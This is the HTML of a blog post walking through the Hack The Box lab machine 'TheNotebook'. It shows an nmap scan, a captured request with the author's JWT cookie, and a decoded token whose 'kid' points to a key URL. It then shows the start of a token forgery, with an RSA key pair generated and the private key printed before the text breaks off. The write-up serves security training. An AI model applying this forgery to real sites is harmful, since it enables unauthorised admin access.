@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	06 Mar 2021IP:	10.10.10.230">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[TheNotebook]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/03/09/TheNotebook/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	06 Mar 2021IP:	10.10.10.230">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb197.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb198.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb199.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1911.jpg">
+<meta property="article:published_time" content="2021-03-09T03:26:17.000Z">
+<meta property="article:modified_time" content="2021-08-01T09:31:55.899Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb197.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/03/09/TheNotebook/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/03/09/TheNotebook/","path":"2021/03/09/TheNotebook/","title":"Hack-The-Box-walkthrough[TheNotebook]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[TheNotebook] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webpage"><span class="nav-number">3.</span> <span class="nav-text">webpage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user"><span class="nav-number">4.</span> <span class="nav-text">user</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root"><span class="nav-number">5.</span> <span class="nav-text">root</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">6.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">7.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/03/09/TheNotebook/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[TheNotebook] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[TheNotebook]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-03-09 11:26:17" itemprop="dateCreated datePublished" datetime="2021-03-09T11:26:17+08:00">2021-03-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-08-01 17:31:55" itemprop="dateModified" datetime="2021-08-01T17:31:55+08:00">2021-08-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	06 Mar 2021<br>IP:	10.10.10.230</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb197.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.230</span></span><br><span class="line">PORT      STATE    SERVICE VERSION</span><br><span class="line">22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open     http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">10010/tcp filtered rxapi</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h3 id="webpage"><a href="#webpage" class="headerlink" title="webpage"></a>webpage</h3><p>egister, write notes, and it will assign a uuid and a cookie</p>
+<p>request pkg:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /a22c35fe-ccb9-4128-971a-0f96e2b9108d/notes/add HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.10.10.230</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 20</span><br><span class="line"></span><br><span class="line">Origin: http://10.10.10.230</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://10.10.10.230/a22c35fe-ccb9-4128-971a-0f96e2b9108d/notes/add</span><br><span class="line"></span><br><span class="line">Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Imx1Y2lmZXIxMSIsImVtYWlsIjoiMTE4NTE1MTg2N0BxcS5jb20iLCJhZG1pbl9jYXAiOjB9.i2HuA6-7YK2MniK6nuBOrwxvGRgJf0cZkUif2bNYN77BSZBkuqOducOZI-BuAGPZKrLelZhecaZxVW1OtsaTuM0-fyz48ar5I34K78FDazAtgWbuIb8atjZQG2Vo3OAFO4gv4Jlys5Vl8V7XZSgdW_DrJt8pSL0nSajDAG5dQCwlv0phweF19KifvADNQGlo_woN7QsK25lsp8LQIUdVn2jj0q7B0V1h7gLu7lIs1r9YhZrpmMG-Q0cnCscnN6o-IwnwP4h4SjHEQWBLPuhbCw9yodvJhzKo_hqIGASha98NjXgt43ruBaPSCPlJEaLNnfilQbC9jkLjiEQyifQmh62VptzBLVrgaUwKcxBkalJdyt8UUCw_77dTMXr202QsS-05wFkWVd_03yKgQFNL2whlIwKa_F5jyclxRa8SWJ3CQrM0PMhLPPzhp4XKvGGo00OJjLHodwV0EEVq1VrunsnFEkp-yg81Ms0z8_fejSWCoqdVaThf6uuK-_XpvS49pV8tnkvUa3U4slnJqhk2LaUuW3CGGGXTRvbEw1CVQPcrK64tIZzzVm7iT05sybOUBJIQGVcYsWbGfrvwitPBxrKXTlFpau5cxv9M5MkfjcDMl5qh0-xUAcH4qv5TO18BFRVvNosbmdPkIyibbBhSMTTd_ZRJlZyvBHP1LItD6lg; uuid=a22c35fe-ccb9-4128-971a-0f96e2b9108d</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">title=<span class="built_in">test</span>&amp;note=<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>uuid:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a22c35fe-ccb9-4128-971a-0f96e2b9108d</span><br></pre></td></tr></table></figure>
+
+<p>cookie:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Imx1Y2lmZXIxMSIsImVtYWlsIjoiMTE4NTE1MTg2N0BxcS5jb20iLCJhZG1pbl9jYXAiOjB9.i2HuA6-7YK2MniK6nuBOrwxvGRgJf0cZkUif2bNYN77BSZBkuqOducOZI-BuAGPZKrLelZhecaZxVW1OtsaTuM0-fyz48ar5I34K78FDazAtgWbuIb8atjZQG2Vo3OAFO4gv4Jlys5Vl8V7XZSgdW_DrJt8pSL0nSajDAG5dQCwlv0phweF19KifvADNQGlo_woN7QsK25lsp8LQIUdVn2jj0q7B0V1h7gLu7lIs1r9YhZrpmMG-Q0cnCscnN6o-IwnwP4h4SjHEQWBLPuhbCw9yodvJhzKo_hqIGASha98NjXgt43ruBaPSCPlJEaLNnfilQbC9jkLjiEQyifQmh62VptzBLVrgaUwKcxBkalJdyt8UUCw_77dTMXr202QsS-05wFkWVd_03yKgQFNL2whlIwKa_F5jyclxRa8SWJ3CQrM0PMhLPPzhp4XKvGGo00OJjLHodwV0EEVq1VrunsnFEkp-yg81Ms0z8_fejSWCoqdVaThf6uuK-_XpvS49pV8tnkvUa3U4slnJqhk2LaUuW3CGGGXTRvbEw1CVQPcrK64tIZzzVm7iT05sybOUBJIQGVcYsWbGfrvwitPBxrKXTlFpau5cxv9M5MkfjcDMl5qh0-xUAcH4qv5TO18BFRVvNosbmdPkIyibbBhSMTTd_ZRJlZyvBHP1LItD6lg;</span><br></pre></td></tr></table></figure>
+
+<p>looking up about auth cookie I found jwt, lets see that too, what that is.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jwt.io/</span><br></pre></td></tr></table></figure>
+
+<p>upon pasting the token..<br>we get something interesting…</p>
+<p>HEADER:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;http://localhost:7070/privKey.key&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PAYLOAD:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;lucifer11&quot;</span>,</span><br><span class="line">  <span class="string">&quot;email&quot;</span>: <span class="string">&quot;1185151867@qq.com&quot;</span>,</span><br><span class="line">  <span class="string">&quot;admin_cap&quot;</span>: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>VERIFY SIGNATURE:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RSASHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>its using keys for the auth (prob. gpg keys) and kid at port 7070</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9hdXRoMC5jb20vYmxvZy9uYXZpZ2F0aW5nLXJzMjU2LWFuZC1qd2tzLw==">Navigating RS256 and JWKS<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>on researching and from the jwt.io itself, we can create out own token for auth..</p>
+<p>lets create one and exploit it.<br>create a new rsa key pair</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20veWdvdHRoaWxmL2JhYTU4ZGE1YzNkZDFmNjlmYWU5">jwtRS256.sh<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> jwtRS256.key</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> jwtRS256.key.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:SS1PrGQQT5jFz4OlkxA7O9gn5zFde0t9jBr26pulXvg root@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 4096]----+</span></span><br><span class="line"><span class="string">|      +Bo        |</span></span><br><span class="line"><span class="string">|      +=.o.      |</span></span><br><span class="line"><span class="string">|      o.*B+ .    |</span></span><br><span class="line"><span class="string">|     o *=B+. . + |</span></span><br><span class="line"><span class="string">|    . = S.o.+ + +|</span></span><br><span class="line"><span class="string">|       * o . B ..|</span></span><br><span class="line"><span class="string">|        .   o =  |</span></span><br><span class="line"><span class="string">|             B   |</span></span><br><span class="line"><span class="string">|           oB.E  |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span></span><br><span class="line"><span class="string">└─# openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub</span></span><br><span class="line"><span class="string">writing RSA key</span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span></span><br><span class="line"><span class="string">└─# cat jwtRS256.key</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIJKQIBAAKCAgEAvI/xUwgbHsfS7jZa7vCu6NsGOZLqjWGMfY3JhL3O10SSe9CD</span></span><br><span class="line"><span class="string">Y4VB0DtHA2Y8yKA1C1hjI2odVgvxmcLgvylhUccd/Fgo2CENr5Ez/K5nbPkMSG8K</span></span><br><span class="line"><span class="string">373AspZjx4jvM25G/K9EX1bh5PWt/mH8G/Sgr4G0D1JqFbro0p6UK7gdzw/OG3kH</span></span><br><span class="line"><span class="string">hz4vUKK8sq/ueZBi8Dhu78UhDqUkROQYmdo+TeF4AAN7ZWYx1DebEq+u47opdqwT</span></span><br><span class="line"><span class="string">60NUmbA+qccc8vdsFwERpcE1eYg6JVRyZUTH8cF6shelSpeTtluvBG+9NvNhPOzZ</span></span><br><span class="line"><span class="string">PW56gMG4Q3lw/5YeUiZMRaOTcKk+fk9Issbos2UuN1I0omFxMNVKjRSK/+EN69LK</span></span><br><span class="line"><span 